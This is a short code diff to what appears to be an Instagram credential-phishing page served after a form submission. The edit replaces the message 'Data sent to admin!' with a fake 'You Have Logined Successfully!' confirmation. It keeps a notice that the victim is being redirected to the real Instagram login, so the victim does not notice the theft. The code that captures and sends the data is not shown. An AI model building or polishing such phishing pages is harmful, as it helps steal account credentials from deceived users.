@@ -576,8 +576,8 @@ def submit_form():
   <div class="container">
     <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" 
          alt="App Logo" class="logo">
-    <h3>✅ Data sent to admin!</h3>
-    <p>You can close this tab.</p>
+    <h3>✅ You Have Logined Successfully!</h3>
+    <p>Thanks for Contribution 💗✅.</p>
     <p><b>Please wait, you are redirecting to Instagram Login in 5s...</b></p>
   </div>
 </body>
